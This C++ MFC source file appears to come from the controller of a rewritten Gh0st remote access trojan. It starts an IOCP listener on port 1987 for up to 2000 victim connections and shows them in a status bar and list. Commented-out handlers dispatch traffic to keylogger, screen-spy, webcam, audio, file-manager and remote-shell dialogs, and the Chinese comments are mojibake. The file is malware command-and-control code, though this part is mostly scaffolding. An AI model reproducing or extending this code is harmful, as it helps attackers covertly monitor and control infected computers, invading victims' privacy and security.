// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "Control.h"

#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// CMainFrame

IMPLEMENT_DYNAMIC(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	ON_WM_CREATE()
	ON_WM_SETFOCUS()
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTSTIP,           // status line indicator
	ID_STAUTSSPEED,
	ID_STAUTSPORT,
	ID_STAUTSCOUNT
};


// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	m_iocpServer = NULL;
}

CMainFrame::~CMainFrame()
{
	if (m_iocpServer) {
		delete m_iocpServer;
		m_iocpServer = NULL;
	}
}


int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	CenterWindow(CWnd::GetDesktopWindow());

	// create a view to occupy the client area of the frame
	if (!m_wndView.Create(NULL, NULL, AFX_WS_DEFAULT_VIEW,
		CRect(0, 0, 0, 0), this, AFX_IDW_PANE_FIRST, NULL))
	{
		TRACE0("Failed to create view window\n");
		return -1;
	}


	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 160);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 70);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 80);

	StartIocp(1987,2000);

	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs

	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
	cs.lpszClass = AfxRegisterWndClass(0);
	cs.hMenu = NULL; // ��ʱȥ���˵�

	//cs.cx = 700;
	////if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
	////{
	////	cs.cx += 100;
	////}
	//cs.cy = 310;
	cs.style &= ~FWS_ADDTOTITLE;
	cs.lpszName = "��д�� Gh0st";


	return TRUE;
}


// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}

#endif //_DEBUG


// CMainFrame message handlers

void CMainFrame::OnSetFocus(CWnd* /*pOldWnd*/)
{
	// forward focus to the view window
	m_wndView.SetFocus();
}

BOOL CMainFrame::OnCmdMsg(UINT nID, int nCode, void* pExtra, AFX_CMDHANDLERINFO* pHandlerInfo)
{
	// let the view have first crack at the command
	if (m_wndView.OnCmdMsg(nID, nCode, pExtra, pHandlerInfo))
		return TRUE;

	// otherwise, do default handling
	return CFrameWnd::OnCmdMsg(nID, nCode, pExtra, pHandlerInfo);
}

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try {
		CMainFrame* pFrame = (CMainFrame*) lpParam;

		CString str;
		str.Format("Send: %.2f kb/s Recv: %.2f kb/s", (float)pFrame->m_iocpServer->m_nSendKbps / 1024, (float)pFrame->m_iocpServer->m_nRecvKbps / 1024);
		pFrame->m_wndStatusBar.SetPaneText(1, str);

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			pFrame->ProcessConnect(pContext);
			break;
		case NC_CLIENT_DISCONNECT:
			pFrame->ProcessDisconnect(pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			pFrame->ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			pFrame->ProcessReceiveComplete(pContext);
			break;
		}
	} catch(...) {}
}

void CMainFrame::ProcessConnect(ClientContext *pContext)
{
	m_wndView.PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
}

void CMainFrame::ProcessDisconnect(ClientContext *pContext)
{
	m_wndView.PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	//if (pContext == NULL)
	//	return;

	//// �������Ի���򿪣�������Ӧ�ĶԻ�����
	//CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];

	//// �������ڴ���
	//if (pContext->m_Dialog[0] > 0)
	//{
	//	switch (pContext->m_Dialog[0])
	//	{
	//	case FILEMANAGER_DLG:
	//		((CFileManagerDlg *)dlg)->OnReceiveComplete();
	//		break;
	//	case SCREENSPY_DLG:
	//		((CScreenSpyDlg *)dlg)->OnReceiveComplete();
	//		break;
	//	case WEBCAM_DLG:
	//		((CWebCamDlg *)dlg)->OnReceiveComplete();
	//		break;
	//	case AUDIO_DLG:
	//		((CAudioDlg *)dlg)->OnReceiveComplete();
	//		break;
	//	case KEYBOARD_DLG:
	//		((CKeyBoardDlg *)dlg)->OnReceiveComplete();
	//		break;
	//	case SYSTEM_DLG:
	//		((CSystemDlg *)dlg)->OnReceiveComplete();
	//		break;
	//	case SHELL_DLG:
	//		((CShellDlg *)dlg)->OnReceiveComplete();
	//		break;
	//	default:
	//		break;
	//	}
	//	return;
	//}

	//switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	//{
	//case TOKEN_AUTH: // Ҫ����֤
	//	m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
	//	break;
	//case TOKEN_HEARTBEAT: // �ظ�������
	//	{
	//		BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
	//		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
	//	}

	//	break;
	//case TOKEN_LOGIN: // ���߰�

	//	{
	//		if (m_iocpServer->m_nMaxConnections <= g_pConnectView->GetListCtrl().GetItemCount())
	//		{
	//			closesocket(pContext->m_Socket);
	//		}
	//		else
	//		{
	//			pContext->m_bIsMainSocket = true;
	//			g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
	//		}
	//		// ����
	//		BYTE	bToken = COMMAND_ACTIVED;
	//		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
	//	}

	//	break;
	//case TOKEN_DRIVE_LIST: // �������б�
	//	// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����,̫��
	//	g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
	//	break;
	//case TOKEN_BITMAPINFO: //
	//	// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����
	//	g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
	//	break;
	//case TOKEN_WEBCAM_BITMAPINFO: // ����ͷ
	//	g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
	//	break;
	//case TOKEN_AUDIO_START: // ����
	//	g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
	//	break;
	//case TOKEN_KEYBOARD_START:
	//	g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
	//	break;
	//case TOKEN_PSLIST:
	//	g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
	//	break;
	//case TOKEN_SHELL_START:
	//	g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
	//	break;
	//	// ����ֹͣ��ǰ����
	//default:
	//	closesocket(pContext->m_Socket);
	//	break;
	//}	
}

// ��Ҫ��ʾ���ȵĴ���
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	//if (pContext == NULL)
	//	return;
	//// �������Ի���򿪣�������Ӧ�ĶԻ�����
	//CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];

	//// �������ڴ���
	//if (pContext->m_Dialog[0] > 0)
	//{
	//	switch (pContext->m_Dialog[0])
	//	{
	//	case SCREENSPY_DLG:
	//		((CScreenSpyDlg *)dlg)->OnReceive();
	//		break;
	//	case WEBCAM_DLG:
	//		((CWebCamDlg *)dlg)->OnReceive();
	//		break;
	//	case AUDIO_DLG:
	//		((CAudioDlg *)dlg)->OnReceive();
	//		break;
	//	default:
	//		break;
	//	}
	//	return;
	//}
}

void CMainFrame::StartIocp(int nPort, int nMaxConnections)
{
	if (m_iocpServer != NULL) {
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}

	m_iocpServer = new CIOCPServer;

	CString strStatus;

	if (m_iocpServer->Initialize(NotifyProc, this, nMaxConnections, nPort)) {
		char hostname[256] = {0};
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL) {
			for (int i=0;; i++) {
				strStatus += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				strStatus += " / ";
			}
		}

		m_wndStatusBar.SetPaneText(0, strStatus);
		strStatus.Format(_T("�˿�: %d"), nPort);
		m_wndStatusBar.SetPaneText(2, strStatus);
	}
	else {
		strStatus.Format(_T("�˿�%d��ʧ��"), nPort);
		m_wndStatusBar.SetPaneText(0, strStatus);
		m_wndStatusBar.SetPaneText(2, _T("�˿�: 0"));
	}

	m_wndStatusBar.SetPaneText(3, _T("����: 0"));
}
